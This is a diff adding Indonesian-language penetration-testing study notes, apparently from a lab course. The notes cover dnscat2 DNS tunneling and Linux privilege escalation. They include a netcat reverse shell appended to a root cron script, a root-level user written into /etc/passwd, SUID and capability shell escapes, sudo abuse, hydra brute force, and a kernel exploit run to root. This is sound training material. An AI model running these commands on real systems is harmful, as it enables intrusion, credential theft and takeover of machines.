@@ -2679,6 +2679,455 @@ Disini server C akan menghubungi server B dan server B akan meneruskan query pad
 03:16:42.495528 IP 192.168.201.7.domain > 192.168.201.64.54651: 18830 2/0/1 TXT "here's something else less useful.", TXT "here's something useful!" (128)
 ```
 
+#### Learn day 21
+
+Sekarang kita akan belajar terkait tunneling menggunakan dnscat. Jadi pada module sebelumnya kita punya 3 server yaitu server A, B dan C yang dimana server A merupakan nameserver authoritative untuk feline.corp dan sedangkan server C yang akan kita lakukan tunneling DNS.
+
+
+Masuk ke server C dengan port forwarding pada server DMZ
+
+```
+ssh -N -R 127.0.0.1:2222:10.4.200.215:22 kali@192.168.45.192
+```
+
+Kita buka koneksi port 2222 pada local ke server C melalui server DMZ. selanjutnya kita ssh pada local machine kita
+
+```
+ssh database_admin@localhost -p 2222
+```
+
+setelah berhasil, kita running dnscat server pada server A dengan command : 
+
+```
+dnscat2-server feline.corp
+ 
+ 
+//kita juga bisa melakukan inspect monitoring dengan tcpdump
+sudo tcpdump -i ens192 udp port 53
+```
+
+Lanjut ke server C, kira running dnscat ke domain feline.corp
+
+```
+./dnscat feline.corp
+```
+
+Jika connection established artinya sukses, dan lanjut ke server A :
+
+```
+//untuk list session
+windows
+
+//untuk memilih window pada nomor 1
+window -i 1
+
+
+//setelah itu kita bisa listen seperti 
+listen 0.0.0.0:4445 172.16.200.217:445
+
+//atau local
+listen 127.0.0.1:4445 172.16.200.217:445
+```
+
+Disini kita melakukan forwarding pada port 4445 ke 172.16.200.217:445 yang dimana kita bisa langsung melakukan koneksi smb dari local maupun public IP server A
+
+```
+//koneksi ke server A dari attacker machine
+smbclient -p 4445 -L //192.168.200.7 -U hr_admin --password=Welcome1234
+
+
+//atau koneksi dari local server A 
+smbclient -p 4445 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+```
+
+
+##### Linux Privilege Escalation
+
+Selanjutnya yaitu Privilege Escalation pada linux jadi kita akan bahas beberapa unit pembelajaran berikut : 
+
+- Enumerating linux
+- Exposed Confidential Information
+- Insecure File Permissions
+- Abusing System Linux Components
+
+Jadi 4 topik ini yang akan kita bahas, jadi pertama kita mulai dari enumeration manual seperti cek user, kernel maupun hostname
+
+```
+//cek user
+id
+
+//melihat informasi user
+cat /etc/passwd
+
+//cek hostname
+hostname
+
+//cek detail dan versi sistem operasi
+cat /etc/issue
+cat /etc/os-release
+uname -a
+
+//cek informasi process
+ps aux
+ps auxfw
+
+
+//cek konfigurasi ip dan network
+ip a
+ifconfig
+
+//cek routing table 
+route 
+route l
+
+
+//cek port terbuka
+ss -anp
+netstat -tulpn
+ss -anp
+
+//cek firewall rule(iptables)
+cat /etc/iptables/rules.v4
+
+
+//check cronjob
+ls -la /etc/cron*
+crontab -l
+
+//check cronjob root
+sudo crontab -l
+
+//check installed app dpkg
+dpkg -l
+
+
+//find writable folder
+find / -writable -type d 2>/dev/null
+```
+
+Pada sebagian sistem, kadangkala kita menemukan suatu file yang di mount(pasang) dan mungkin berisi informasi berharga jadi kita bisa melihat semua file drive dengan membaca /etc/fstab atau menggunakan mount command
+
+```
+cat /etc/fstab
+mount
+
+//untuk melihat semua disk
+lsblk
+
+//cek module kernel
+lsmod
+
+//Untuk informasi spesifik module kernel
+/sbin/modinfo nama_module
+/sbin/modinfo libata
+```
+
+Pada linux terdapat special permission untuk menjalankan suatu binary yang dikenal dengan SUID/SGID binary yang merupakan suatu binary yang jika dijalankan akan menjalankan dari user yang memiliki binary tersebut dan untuk itu kita bisa memanfaatkan find untuk menemukan SUID binary
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+
+Jika diatas merupakan cara manual, kita juga bisa menggunakan cara yang lebih automated dengan linepeas dan unix-privesc-check
+
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+https://pentestmonkey.net/tools/audit/unix-privesc-check
+
+
+##### Inspecting User Trails
+
+salah satu target saat melakukan privesc yaitu ada pada dotfiles(file yg diawali dengan titik) dimana disini kadang menyimpan beberapa konfigurasi beserta credential user.
+
+salah satu contohnya yaitu .bashrc, environment variable, .bash_history dan .profile. dan contoh skenario privesc pada lab ini yaitu kita mulai baca script bashrc
+
+```
+cat .bashrc 
+
+//output: 
+# don't put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+export SCRIPT_CREDENTIALS="lab"
+HISTCONTROL=ignoreboth
+```
+
+Dimana ditemukan suatu export environment variable SCRIPT_CREDENTIAL, jadi kita bisa memverifikasi dengan 
+
+```
+printenv
+```
+
+Kita bisa langsung saja melakukan cred stuffing seperti 
+
+```
+su root
+su - root
+```
+Dan masukkan password "lab" dan seharusnya berhasil, atau kita juga bisa melakukan generate wordlist menggunakan crunch
+
+```
+crunch 6 6 -t Lab%%% > wordlist
+```
+
+Dimana disini kita buat minimum dan maximum wordlist dengan 6 character dengan output seperti : 
+
+```
+kali@kali:~$ cat wordlist
+Lab000
+Lab001
+Lab002
+Lab003
+Lab004
+```
+
+Karena pada machine ini terdapat user eve, jadi kita bisa lanjut dengan hydra
+
+```
+hydra -l eve -P wordlist  192.168.200.214 -t 4 ssh -V
+```
+
+dan ditemukan password Lab123, lalu lanjut ssh dan cek sudo permission
+
+```
+sudo -l
+```
+Ternyata user mempunyai sudo all yang artinya kita bisa melakukan command apapun menggunakan sudo, dan untuk get root tinggal ketik 
+
+```
+sudo -i
+```
+
+##### Inspecting Service Footprint
+Daemon merupakan service yang dijalankan saat booting tanpa memerlukan interkasi user. dan server linux kadang menjalankan banyak daemon. jadi attack surface pada service ini sangat tinggi dan untuk melakukan enumeration, kita harus memeriksa behaviour process yang sedang berjalan.
+
+Jadi untuk itu kita perlu melakukan enumeration menggunakan command ps dan memantau process tiap 2 detik menggunakan watch
+
+```
+
+//grep yang berhubungan dengan kata "pass"
+watch -n 1 "ps -aux | grep pass"
+
+//or detailed
+watch -n 1 "ps -auxfw | grep pass"
+```
+
+jadi dengan ini, kita bisa memantau daemon yang dimana kadang terdapat beberapa process yang berharga. dalam contoh ini kita berhasil melihat suatu process yang sedang berjalan dengan credential eve tiap beberapa detik
+
+```
+joe       3199  0.0  0.1   6504  3356 pts/0    S+   14:00   0:00 watch -n 1 ps -aux | grep pass
+root      3234  0.0  0.0   2384   692 ?        S    14:00   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
+root      3235  0.0  0.0   2356  1700 ?        S    14:00   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
+```
+
+dan jika kita mempunyai izin untuk capture packet dengan tcpdump, kita juga bisa melihat dan menangkap credentialnya
+
+```
+sudo tcpdump -i lo -A | grep "pass"
+```
+
+
+#### Abuse cronjobs
+
+Jadi teknik kali ini dengan memanfaatkan cronjob, jadi vector privesc pada cronjob bisa menjadi target utama kita dimana rumusnya saat ada suatu file / binary yang di eksekusi tiap interval waktu tertentu menggunakan cronjob dan binary tersebut dapat ditulis/writable, kita bisa memodifikasi isi dari file tersebut dan menunggu untuk
+
+
+untuk melihat cronjob yang berjalan, kita bisa memeriksa file log 
+
+```
+grep "CRON" /var/log/syslog
+//or
+cat /var/log/cron.log | grep "CRON"
+
+
+//output: 
+Feb 15 13:53:54 debian-privesc CRON[1376]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Feb 15 13:54:01 debian-privesc CRON[1385]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Feb 15 13:55:01 debian-privesc CRON[1559]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+```
+
+Dimana disini suatu cron dieksekusi sebagai root, dan karena writable jadi kita bisa memodifikasi untuk melakukan reverse shell pada file user_backups.sh
+
+```
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.192 443 >/tmp/f" >> user_backups.sh
+```
+
+dan kita aktfikan listener pada port 443, tunggu beberapa menit sehrausnya reverse shell berhasil.
+
+##### Abusing password authentication
+
+Umumnya password di linux disimpan pada file /etc/shadow tetapi hal ini tidak bisa dibaca oleh user biasa dan secara historis, linux menyimpan semua informasi user pada /etc/passwd dan jika pada kolom kedua berisi password maka password tersebut dianggap valid. Kali ini anggaplah file /etc/passwd writable dan kita akan membuat user baru dan untuk itu kita perlu generate hash menggunakan openssl 
+```
+openssl passwd heker
+
+//output: ogu/hx4Wd9V.Q
+```
+
+setelah itu kita perlu menulis pada file /etc/passwd dengan format berikut : 
+
+```
+echo "root2:ogu/hx4Wd9V.Q:0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
+lalu kita login dengan user root2 dan password heker 
+
+```
+su root2
+```
+
+dan seharusnya berhasil mendapatkan root
+
+
+
+##### Setuid binary & Capabilities
+
+Seperti yang dibahas diatas, setuid binary merupakan suatu binary yang jika kita menjalankannya, binary tersebut akan dijalankan dengan hak akses pemilik/owner file tersebut. 
+
+Untuk melakukan enumeration kita bisa menggunakan find 
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Disini terlihat binary find mempunyai setuid binary, jadi kita bisa memanfaatkan binary find untuk meningkatkan hak akses
+
+```
+find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
+```
+
+Dan kedua ada capabilities, yang merupakjan atribut tambahakn pada suatu binary, process maupun service untuk memberikan suatu privilege tertentu. capabilities ini jika salah dikonfigurasi juga dapat dimanfaatkan untuk privilege escalation.
+
+Untuk identifikasi kita bisa menjalankan command getcap
+
+```
+/usr/sbin/getcap -r / 2>/dev/null
+
+//output: 
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/perl5.28.1 = cap_setuid+ep
+```
+
+Terlihat ada output binary perl dengan setuid aktif bersama dengan flag +ep yang menentukan jika capabilities ini diizinkan. jadi kita bisa manfaatkan perl untuk melakukan privilege escalation
+
+```
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
+
+
+untuk lebih lengkapnya dari miskonfigurasi setuid dan capabilites bisa langsung kunjungi https://gtfobins.org/
+
+
+#### Sudo Abuse
+Sudo merupakan utilitas untuk melakukan eksekusi process, file dengan hak akses root dan konfigurasi ditetapkan pada file /etc/sudoers
+
+Dan untuk menampilkan command apa yang diset untuk dieksekusi dengan sudo kita bisa ketik 
+```
+sudo -l
+
+//output:
+User joe may run the following commands on debian-privesc:
+    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
+```
+
+Kebetulan, output disini terdapat binary crontab, tcpdump dan apt-get. mulai dengan tcpdump dulu
+
+```
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+```
+
+disini sebenarnya tekniknya valid, tapi output menunjukkan permission denied dan jika kita cek log
+
+```
+cat /var/log/syslog | grep tcpdump
+```
+
+Ternyata berasal dari apparmor, dan apparmor merupakan kernel module yang memproteksi dan menyediakan MAC(mandatory access control) pada linux dan aktif secara default pada debian 10. kita bisa verif dengan command 
+
+```
+aa-status
+```
+
+Jadi kita lanjut dengan apt-get, dengan acuan gtfobins kita bisa melakukan serangkaian command berikut
+
+```
+sudo apt-get changelog apt
+!/bin/sh
+```
+yang seharusnya akan spawning shell root.
+
+
+##### Kernel exploitation
+Kernel exploitation merupakan eksploitasi langsung pada kernel dan salah satu cara terbaik untuk melakukan privesc. Kernel exploit juga tergantung dari versi dan juga jenis operating system-nya.
+
+jadi untuk identifikasi seperti berikut  :
+
+```
+cat /etc/issue 
+//output: Ubuntu 16.04.4 LTS \n \l
+
+uname -r 
+//output: 4.4.0-116-generic
+
+arch
+//output: x86_64
+```
+
+Dengan informasi diatas, kita bisa cari dengan searchsploit untuk exploit yang relevan
+
+```
+searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
+
+//or
+searchsploit "Ubuntu 16" | grep "4." | grep -v "< 4.4.0" | grep -v "4.8"
+```
+
+dan ditemukan exploit yang cocok 
+
+```
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | linux/local/45010.c
+```
+
+dan tinggal kita download lalu tranfer pada machine target
+
+```
+searchsploit -m linux/local/45010.c    
+
+//transfer
+scp 45010.c joe@192.168.200.216:~/ 
+```
+
+lalu compile pada machine target
+
+```
+gcc 45010.c -o exploit
+```
+
+dan seharusnya sukses saat exploit dijalankan
+
+```
+joe@ubuntu-privesc:~$ ./exploit 
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff880078fa8200
+[*] Leaking sock struct from ffff880075c82000
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff88007c2d1c00
+[*] UID from cred structure: 1001, matches the current: 1001
+[*] hammering cred structure at ffff88007c2d1c00
+[*] credentials patched, launching shell...
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(joe)
+```
+
 #### Random Notes
 enable color winpeas
 ```
